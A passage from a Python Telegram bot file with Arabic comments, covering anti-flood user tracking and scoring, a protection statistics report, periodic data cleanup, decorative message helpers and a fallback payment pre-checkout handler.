    user_actions[target] = []
    user_warnings[target] = 0
    user_scores[target] = 0
    callback_tracker[target] = []
    command_tracker[target] = []
    flood_tracker[target] = []
    
    if target in suspicious_patterns:
        del suspicious_patterns[target]
    if target in banned_users:
        del banned_users[target]
    
    bot.answer_callback_query(call.id, "✅ تم مسح البيانات", show_alert=True)


def show_detailed_report(chat_id, msg_id=None):
    """تقرير مفصل"""
    stats = bot_config.get("protection_stats", {})
    
    # إحصائيات الأنماط
    all_patterns = {}
    for uid, patterns in suspicious_patterns.items():
        for p, info in patterns.items():
            if p not in all_patterns:
                all_patterns[p] = 0
            all_patterns[p] += info["count"]
    
    patterns_text = ""
    for p, count in sorted(all_patterns.items(), key=lambda x: x[1], reverse=True)[:5]:
        patterns_text += f"├── {p}: {count}\n"
    
    if not patterns_text:
        patterns_text = "├── لا توجد أنماط\n"
    
    # تصنيف المستخدمين
    safe_count = len([s for s in user_scores.values() if s < 2])
    watched_count = len([s for s in user_scores.values() if 2 <= s < 5])
    suspicious_count = len([s for s in user_scores.values() if 5 <= s < 10])
    danger_count = len([s for s in user_scores.values() if s >= 10])
    
    msg = (
        f"╔═══════════════════════════════════╗\n"
        f"║ 📊 تقرير الحماية المفصل 📊 ║\n"
        f"╚═══════════════════════════════════╝\n\n"
        f"📈 الإحصائيات الكلية:\n"
        f"├── 🚫 إجراءات محظورة: {stats.get('total_blocked', 0)}\n"
        f"├── ⚠️ تحذيرات: {stats.get('total_warnings', 0)}\n"
        f"└── ⛔ حظر تلقائي: {stats.get('total_bans', 0)}\n\n"
        f"👥 تصنيف المستخدمين:\n"
        f"├── ✅ آمن: {safe_count}\n"
        f"├── 👁️ مراقب: {watched_count}\n"
        f"├── 🟠 مشبوه: {suspicious_count}\n"
        f"└── 🔴 خطر: {danger_count}\n\n"
        f"🔍 أكثر الأنماط شيوعاً:\n{patterns_text}\n"
        f"⏰ آخر تحديث: {datetime.now().strftime('%H:%M:%S')}"
    )
    
    m = types.InlineKeyboardMarkup()
    m.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="prot_back"))
    
    if msg_id:
        try:
            bot.edit_message_text(msg, chat_id, msg_id, reply_markup=m, parse_mode="HTML")
            return
        except:
            pass
    bot.send_message(chat_id, msg, reply_markup=m, parse_mode="HTML")


def cleanup_old_data():
    """تنظيف البيانات القديمة"""
    now = time.time()
    
    # تنظيف الإجراءات القديمة
    for uid in list(user_actions.keys()):
        user_actions[uid] = [a for a in user_actions[uid] if now - a["time"] < 300]
        if not user_actions[uid]:
            del user_actions[uid]
    
    # تنظيف المتتبعات
    for uid in list(callback_tracker.keys()):
        callback_tracker[uid] = [t for t in callback_tracker[uid] if now - t < 300]
        if not callback_tracker[uid]:
            del callback_tracker[uid]
    
    for uid in list(command_tracker.keys()):
        command_tracker[uid] = [t for t in command_tracker[uid] if now - t < 300]
        if not command_tracker[uid]:
            del command_tracker[uid]
    
    # تنظيف الحظر المنتهي
    for uid in list(banned_users.keys()):
        if datetime.now() >= banned_users[uid]["until"]:
            del banned_users[uid]
    
    # تخفيف درجات المستخدمين
    for uid in user_scores:
        user_scores[uid] = max(0, user_scores[uid] * 0.9)


# =====================================================
# ✨ تحسينات جمالية
# =====================================================
DECORATIONS = {
    "success": ["🎊", "🎉", "✨", "💫", "🌟"],
    "error": ["❌", "🚫", "⛔", "💔", "😢"],
    "warning": ["⚠️", "🔔", "📢", "💡", "🔥"],
    "loading": ["⏳", "⌛", "🔄", "💫", "✨"],
    "money": ["💰", "💎", "💵", "🪙", "💲"],
    "rank": ["👑", "🏆", "🥇", "⭐", "🎖️"],
}

def get_decoration(category, index=None):
    """الحصول على ديكور عشوائي"""
    if category not in DECORATIONS:
        return "✨"
    
    if index is not None:
        return DECORATIONS[category][index % len(DECORATIONS[category])]
    
    return random.choice(DECORATIONS[category])


def format_number(num):
    """تنسيق الأرقام بشكل جميل"""
    if num >= 1000000:
        return f"{num/1000000:.1f}M"
    elif num >= 1000:
        return f"{num/1000:.1f}K"
    return str(num)


def create_progress_bar(current, total, length=10):
    """إنشاء شريط تقدم جميل"""
    if total == 0:
        return "░" * length
    
    filled = int((current / total) * length)
    empty = length - filled
    
    return "█" * filled + "░" * empty


def format_time_ago(dt):
    """تنسيق الوقت المنقضي"""
    if isinstance(dt, str):
        try:
            dt = datetime.fromisoformat(dt)
        except:
            return dt
    
    diff = datetime.now() - dt
    
    if diff.days > 0:
        return f"منذ {diff.days} يوم"
    elif diff.seconds >= 3600:
        hours = diff.seconds // 3600
        return f"منذ {hours} ساعة"
    elif diff.seconds >= 60:
        minutes = diff.seconds // 60
        return f"منذ {minutes} دقيقة"
    else:
        return "الآن"


# =====================================================
# 🎨 رسائل جميلة
# =====================================================
def send_welcome_animation(chat_id, username):
    """رسالة ترحيب متحركة"""
    frames = [
        "⏳ جاري التحميل...",
        "✨ مرحباً...",
        f"🎊 أهلاً {username}!",
    ]
    
    try:
        msg = bot.send_message(chat_id, frames[0])
        for frame in frames[1:]:
            time.sleep(0.4)
            bot.edit_message_text(frame, chat_id, msg.message_id)
    except:
        pass


def send_success_message(chat_id, title, content, extra=None):
    """رسالة نجاح جميلة"""
    decoration = get_decoration("success")
    
    msg = (
        f"╔═══════════════════════════╗\n"
        f"║ {decoration} {title} {decoration} ║\n"
        f"╚═══════════════════════════╝\n\n"
        f"{content}"
    )
    
    if extra:
        msg += f"\n\n{extra}"
    
    bot.send_message(chat_id, msg, parse_mode="HTML")


def send_error_message(chat_id, title, content):
    """رسالة خطأ جميلة"""
    decoration = get_decoration("error")
    
    msg = (
        f"╔═══════════════════════════╗\n"
        f"║ {decoration} {title} {decoration} ║\n"
        f"╚═══════════════════════════╝\n\n"
        f"{content}"
    )
    
    bot.send_message(chat_id, msg, parse_mode="HTML")


# =====================================================
# 🔄 مهمة تنظيف دورية
# =====================================================
def start_cleanup_task():
    import threading
    
    def cleanup_worker():
        while True:
            try:
                cleanup_old_data()
            except Exception as e:
                print(f"⚠️ Cleanup error: {e}")
            time.sleep(60)  # كل دقيقة
    
    thread = threading.Thread(target=cleanup_worker, daemon=True)
    thread.start()
    print("✅ bot8: Cleanup task started")

start_cleanup_task()


# =====================================================
# ✅ PRE-CHECKOUT (احتياطي)
# =====================================================
@bot.pre_checkout_query_handler(func=lambda query: True)
def bot8_pre_checkout_fallback(pre_checkout_query):
    """معالج احتياطي للدفع"""
    try:
        bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)
    except:
        pass


# =====================================================
# 🚀 تأكيد التحميل
# =====================================================
print("=" * 55)
print("✅ bot8.py — نظام الحماية الذكي")
print("🛡️ مكافحة الرشق: Active")
print("🔐 الأمر السري: /yassou login")
print("✨ التحسينات الجمالية: Active")
print("🔄 التنظيف التلقائي: Running")
print("=" * 55)
